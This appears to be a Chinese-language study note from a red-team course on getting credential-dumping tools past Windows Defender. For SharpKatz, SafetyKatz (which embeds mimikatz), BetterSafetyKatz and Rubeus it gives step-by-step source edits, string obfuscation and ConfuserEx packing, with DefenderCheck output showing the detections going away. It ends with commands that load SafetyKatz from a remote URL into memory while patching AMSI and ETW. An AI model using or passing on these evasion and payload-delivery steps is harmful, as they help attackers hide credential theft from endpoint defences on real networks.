# AV bypass

主要思路是通过混淆（Obfuscation）和字符串操纵（String Manipulation）等技术绕过基于签名的检测

使用检查工具是：[DefenderCheck](https://github.com/t3hbb/DefenderCheck)

# 字符串操纵（String Manipulation）

## 例子1：SharpKatz.exe

使用DefenderCheck检查SharpKatz.exe

```
D:\BaiduNetdiskDownload\CRTE\Tools>DefenderCheck.exe D:\BaiduNetdiskDownload\CRTE\Tools\SharpKatz-master\SharpKatz\bin\Debug\SharpKatz.exe

OriginalFileDetectionStatus is : ThreatFound
Target file size: 235520 bytes
Analyzing...

File matched signature: "VirTool:MSIL/SharpKatz.A"

[!] Identified end of bad bytes at offset 0x1198B in the original file
File matched signature: "HackTool:Win64/Mimikatz.D"

00000000   06 70 00 28 00 08 00 00  48 00 00 00 00 0D 00 08   ·p·(····H·······
00000010   00 32 00 00 00 00 00 00  00 40 00 0A 01 00 00 00   ·2·······@······
00000020   00 00 00 00 00 00 48 00  00 00 00 0E 00 08 00 32   ······H········2
00000030   00 00 00 00 00 00 00 40  00 0A 01 00 00 00 00 00   ·······@········
00000040   00 00 00 00 48 00 00 00  00 0F 00 08 00 32 00 00   ····H········2··
00000050   00 00 00 00 00 40 00 0A  01 00 00 00 00 00 00 00   ·····@··········
00000060   00 00 48 00 00 00 00 10  00 30 00 30 40 00 00 00   ··H······0·0@···
00000070   00 2C 00 24 00 47 06 0A  07 01 00 01 00 00 00 00   ·,·$·G··········
00000080   00 08 00 00 00 B8 03 48  00 08 00 08 00 0B 01 10   ·····?·H········
00000090   00 48 06 50 21 18 00 08  00 13 41 20 00 72 06 70   ·H·P!·····A ·r·p
000000A0   00 28 00 08 00 00 48 00  00 00 00 11 00 30 00 30   ·(····H······0·0
000000B0   40 00 00 00 00 2C 00 24  00 47 06 0A 07 01 00 01   @····,·$·G······
000000C0   00 00 00 00 00 08 00 00  00 B8 03 48 00 08 00 08   ·········?·H····
000000D0   00 0B 01 10 00 8C 06 50  21 18 00 08 00 13 A1 20   ·····?·P!·····?
000000E0   00 C6 06 70 00 28 00 08  00 00 49 89 CA B8 3F 00   ·?·p·(····I?ê??·
000000F0   00 00 0F 05 C3 74 25 8B  24 43 72 64 41 FF 15 49   ····?t%?$CrdA?·I
```

教材里的方法是把整个项目的```Credentials```替换成```Credents```,然后生成exe再检查

然而操作了上面的步骤以后依然过不了wd，不知道是不是因为wd的签名更新了


## 例子2：SafetyKatz 

1. 下载最新版本的[Out-CompressedDll.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-CompressedDll.ps1)和mimikatz

2. 使用Out-CompressedDll.ps1操作mimikatz，导出结果到outputfilename.txt
```
PS D:\BaiduNetdiskDownload\CRTE\Tools> . .\Out-CompressedDll.ps1
PS D:\BaiduNetdiskDownload\CRTE\Tools> Out-CompressedDll D:\BaiduNetdiskDownload\CRTE\Tools\mimikatz_trunk\x64\mimikatz.exe > outputfilename.txt
PS D:\BaiduNetdiskDownload\CRTE\Tools>
```

3. 打开outputfilename.txt

4. 替换constants.cs
把```$EncodedCompressedFile```这个变量的内容

```
$EncodedCompressedFile = @'3H15fF.....s/wA='
```

复制到SafetyKatz项目的```constants.cs```这个文件里的```compressedMimikatzString```变量
```
namespace SafetyKatz
{
    public static class Constants
    {
        // compressed mimikatz.exe output from Out-CompressedDLL
        public static string compressedMimikatzString = "3H15fF.....s/wA=";
    }
}

```

5. 替换Program.cs

把outputfilename.txt下面这行代码的数字
```
$DeflatedStream.Read($UncompressedFileBytes, 0, 1234696) | Out-Null
```
替换到Program.cs的 111 和 116行

```
                Byte[] unpacked = new byte[1234696];
                ...
                ...
                stream.Read(unpacked, 0, 1234696);
```

6. 保存。生成exe。使用DefenderCheck检查

```
D:\BaiduNetdiskDownload\CRTE\Tools>DefenderCheck.exe D:\BaiduNetdiskDownload\CRTE\Tools\SafetyKatz-master\SafetyKatz\bin\Debug\SafetyKatz.exe

OriginalFileDetectionStatus is : ThreatFound
Target file size: 1569280 bytes
Analyzing...

File matched signature: "VirTool:MSIL/DumpLsass.A"

[!] Identified end of bad bytes at offset 0x17E009 in the original file
File matched signature: "VirTool:MSIL/DumpLsass.A"

00000000   76 00 30 00 52 00 70 00  65 00 4C 00 6D 00 69 00   v·0·R·p·e·L·m·i·
00000010   62 00 37 00 62 00 68 00  74 00 65 00 31 00 53 00   b·7·b·h·t·e·1·S·
00000020   56 00 6C 00 64 00 76 00  6A 00 45 00 43 00 35 00   V·l·d·v·j·E·C·5·
00000030   31 00 66 00 48 00 6D 00  6B 00 38 00 50 00 4B 00   1·f·H·m·k·8·P·K·
00000040   69 00 30 00 67 00 32 00  66 00 75 00 6B 00 63 00   i·0·g·2·f·u·k·c·
00000050   6E 00 54 00 67 00 71 00  38 00 6C 00 46 00 74 00   n·T·g·q·8·l·F·t·
00000060   72 00 4D 00 75 00 39 00  37 00 54 00 50 00 75 00   r·M·u·9·7·T·P·u·
00000070   58 00 64 00 59 00 6A 00  76 00 66 00 30 00 69 00   X·d·Y·j·v·f·0·i·
00000080   4B 00 50 00 4A 00 6F 00  61 00 49 00 41 00 79 00   K·P·J·o·a·I·A·y·
00000090   4F 00 38 00 67 00 74 00  36 00 57 00 50 00 52 00   O·8·g·t·6·W·P·R·
000000A0   41 00 71 00 30 00 30 00  5A 00 4D 00 50 00 64 00   A·q·0·0·Z·M·P·d·
000000B0   32 00 73 00 5A 00 57 00  51 00 73 00 37 00 32 00   2·s·Z·W·Q·s·7·2·
000000C0   78 00 77 00 6E 00 77 00  54 00 57 00 77 00 4D 00   x·w·n·w·T·W·w·M·
000000D0   56 00 68 00 32 00 73 00  30 00 79 00 48 00 32 00   V·h·2·s·0·y·H·2·
000000E0   56 00 69 00 7A 00 45 00  37 00 73 00 2F 00 77 00   V·i·z·E·7·s·/·w·
000000F0   41 00 3D 00 00 0B 6C 00  73 00 61 00 73 00 73 00   A·=···l·s·a·s·s·
```

看起来是有一个lsass的字符串触发了签名

7. 修改Program.cs里的
```
 Process[] processes = Process.GetProcessesByName("lsass");
```

为：
```
string str = "ssasl";
 
string reverse = str.Reverse();
Process[] processes = Process.GetProcessesByName(reverse);
```

注意还需要在当前类外面添加代码
```
 public static class Extensions
    {
        public static string Reverse(this string str)
        {
            char[] chars = str.ToCharArray();
            Array.Reverse(chars);
            return new string(chars);
        }
    }
```

保存。重新生成exe

8. 再次检查,已经可以绕过wd
```
D:\BaiduNetdiskDownload\CRTE\Tools>DefenderCheck.exe D:\BaiduNetdiskDownload\CRTE\Tools\SafetyKatz-master\SafetyKatz\bin\Debug\SafetyKatz.exe

OriginalFileDetectionStatus is : NoThreatFound
[+] No threat found in submitted file!

```

## 例子3，BetterSafetyKatz

教材上的方法是：
1. 把mimikatz的zip转化成base64
```
PS E:\BaiduNetdiskDownload\CRTE\Tools> $filename = "E:\BaiduNetdiskDownload\CRTE\Tools\mimikatz_trunk.zip"
PS E:\BaiduNetdiskDownload\CRTE\Tools> [Convert]::ToBase64String([io.file]::ReadAllBytes($filename)) > o.txt
```

2. 在program.cs加一个变量

```
string base64value = "<上面mimikatz的base64>"
```

3. 注释program.cs这一段

```
  //Is it a URI?
                // if (latestPath.StartsWith("http"))
                // {
                //     //Download
                //     zipStream = webClient.DownloadData(latestPath);
                // }
                // else
                // {
                //     //Read file from path
                //     zipStream = File.ReadAllBytes(latestPath);
                // }
```

底下再加一行
```
zipStream = Convert.FromBase64String(base64value);
```

重新生成

但是单凭上面几步不能过现在的wd

## 例子4 使用[ConfuserEx](https://github.com/mkaring/ConfuserEx)混淆Rubeus.exe

教材的步骤是：

• In Project tab select the Base Directory where the binary file is located.
• In Project tab Select the Binary File that we want to obfuscate.
• In Settings tab add the rules.
• In Settings tab edit the rule and select the preset as `Normal`.
• In Protect tab click on the protect button.

生成的exe使用DefenderCheck检查
```
D:\BaiduNetdiskDownload\CRTE\Tools>DefenderCheck.exe D:\BaiduNetdiskDownload\CRTE\Tools\Rubeus-master\Rubeus\bin\Debug\Confused\Rubeus.exe

OriginalFileDetectionStatus is : ThreatFound
Target file size: 853504 bytes
Analyzing...

File matched signature: "VirTool:MSIL/Kekeo.NT!MTB"

[!] Identified end of bad bytes at offset 0xCD71A in the original file
File matched signature: "VirTool:MSIL/Kekeo.NT!MTB"

00000000   50 65 72 6D 69 73 73 69  6F 6E 41 74 74 72 69 62   PermissionAttrib
00000010   75 74 65 2C 20 6D 73 63  6F 72 6C 69 62 2C 20 56   ute, mscorlib, V
00000020   65 72 73 69 6F 6E 3D 34  2E 30 2E 30 2E 30 2C 20   ersion=4.0.0.0,
00000030   43 75 6C 74 75 72 65 3D  6E 65 75 74 72 61 6C 2C   Culture=neutral,
00000040   20 50 75 62 6C 69 63 4B  65 79 54 6F 6B 65 6E 3D    PublicKeyToken=
00000050   62 37 37 61 35 63 35 36  31 39 33 34 65 30 38 39   b77a5c561934e089
00000060   15 01 54 02 10 53 6B 69  70 56 65 72 69 66 69 63   ··T··SkipVerific
00000070   61 74 69 6F 6E 01 08 01  00 08 00 00 00 00 00 1E   ation···········
00000080   01 00 01 00 54 02 16 57  72 61 70 4E 6F 6E 45 78   ····T··WrapNonEx
00000090   63 65 70 74 69 6F 6E 54  68 72 6F 77 73 01 06 20   ceptionThrows··
000000A0   01 01 11 81 F9 08 01 00  07 01 00 00 00 00 0B 01   ···?ù···········
000000B0   00 06 52 75 62 65 75 73  00 00 05 01 00 00 00 00   ··Rubeus········
000000C0   17 01 00 12 43 6F 70 79  72 69 67 68 74 20 C2 A9   ····Copyright ??
000000D0   20 20 32 30 31 38 00 00  29 01 00 24 36 35 38 63     2018··)··$658c
000000E0   38 62 37 66 2D 33 36 36  34 2D 34 61 39 35 2D 39   8b7f-3664-4a95-9
000000F0   35 37 32 2D 61 33 65 35  38 37 31 64 66 63 30 36   572-a3e5871dfc06
```

这里需要在本地生成一个GUID

```
PS C:\Users\max> New-Guid

Guid
----
2fec7872-7656-46d8-a739-635f07074643


```

修改Assemblyinfo.cs里的第23行
```
[assembly: Guid("2fec7872-7656-46d8-a739-635f07074643")]
```

代码里对这一行的注释是：
> The following GUID is for the ID of the typelib if this project is exposed to COM


vs重新编译以后，使用ConfuserEx再次生成，已可以过WD
```
D:\BaiduNetdiskDownload\CRTE\Tools>DefenderCheck.exe D:\BaiduNetdiskDownload\CRTE\Tools\Rubeus-master\Rubeus\bin\Debug\Confused\Rubeus.exe

OriginalFileDetectionStatus is : NoThreatFound
[+] No threat found in submitted file!
```

# Payload Delivery

## Loader.exe

可用于从文件夹或者url上加载binary（ It can be used to load binary from filepath or URL and patch AMSI & ETW while executing）

```
C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe
```

在内存中加载(We also have AssemblyLoad.exe that can be used to load the NetLoader in-memory from a URL which then loads a binary from a filepath or URL)
```
C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe
```